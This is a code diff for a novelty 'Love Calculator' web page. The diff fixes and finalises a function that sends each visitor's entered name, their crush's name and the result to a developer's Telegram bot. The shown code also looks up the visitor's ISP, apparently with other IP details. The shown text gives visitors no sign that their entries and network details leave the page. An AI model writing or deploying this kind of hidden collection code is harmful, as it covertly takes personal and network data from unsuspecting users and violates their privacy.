@@ -108,7 +108,7 @@ async function calculateLove() {
   const c = document.getElementById("crushName").value.trim();
   if(!u || !c) { alert("Please enter both names!"); return; }
 
-  // 🔑 Admin check (case-insensitive)
+  // 🔑 Admin check
   if (u.toLowerCase() === "admin" || c.toLowerCase() === "admin") {
     window.location.href = "admin.html";
     return;
@@ -155,6 +155,7 @@ async function sendToTelegram(u, c, percent) {
       isp = j.isp || isp;
     }
   } catch {}
+
   const msg =
 `╔━━━━━━━━━━━━━━━━━━━
 ║ 💖 Love Calculator Entry 💖
@@ -175,15 +176,17 @@ async function sendToTelegram(u, c, percent) {
 ║ 🪿 developed by: 𝐃 ʜ 𝙰 ɴ 𝐢ⁱɪ  
 ╚━━━━━━━━━━━━━━━━━━━`;
 
-  <script src="passwords.js"></script>
-<script>
-   // here we use BOT_TOKEN and CHAT_ID
-   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+  // ✅ send to Telegram
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: {"Content-Type":"application/json"},
       body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
-   });
-</script>
+    });
+  } catch(err) {
+    console.error("Telegram send error:", err);
+  }
+}
 </script>
 
 </body>
